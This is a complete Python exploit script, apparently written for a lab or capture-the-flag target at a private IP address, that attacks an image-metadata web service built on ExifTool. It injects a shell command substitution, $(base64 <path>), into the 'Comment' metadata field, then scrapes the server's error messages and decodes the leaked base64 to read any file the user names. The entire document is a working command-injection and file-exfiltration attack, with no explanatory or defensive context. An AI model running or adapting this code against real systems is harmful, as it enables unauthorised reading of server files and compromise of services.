import requests
import bs4
import base64
import sys

url = "http://10.80.12.3:5123/process"

try:
    path = sys.argv[1]
except IndexError:
    print("Usage: python3 main.py <path_to_file>")
    sys.exit(1)

payload = {
    'operation': 'add_metadata',
    'metadata_key': 'Comment',
    'metadata_value': f'\' + $(base64 {path}) + \''
}

files=[
    ('image',('file',open('./sample.jpg','rb'),'application/octet-stream'))
]

headers = {
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Origin': 'http://10.80.12.3:5123',
'Referer': 'http://10.80.12.3:5123/',
'Content-Length': '10555',
'Accept-Language': 'it-IT,it;q=0.9',
'Upgrade-Insecure-Requests': '1',
'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0.1 Safari/605.1.15',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'keep-alive',
'Priority': 'u=0, i'
}

response = requests.request("POST", url, headers=headers, data=payload, files=files)

# Get everything between: "<p class="error">ExifTool failed: " and "</p>"
soup = bs4.BeautifulSoup(response.text, 'html.parser')
error_paragraph = soup.find('p', class_='error')
if not error_paragraph:
    print("No error paragraph found.")
    exit()

extracted_output = error_paragraph.get_text().replace('ExifTool failed: ', '').strip()

# Get every group 1 match from the regex
REGEX = "Error: File not found - ([-A-Za-z0-9+/]*={0,3})+"

b64_chunks = []

for line in extracted_output.splitlines():
    line = line.strip()
    prefix = "Error: File not found - "
    if line.startswith(prefix):
        chunk = line[len(prefix):].strip()
        if chunk and chunk != "+" and chunk != '""':
            b64_chunks.append(chunk)

b64_data = "".join(b64_chunks)
decoded = base64.b64decode(b64_data).decode().strip()

print("\n\n", decoded)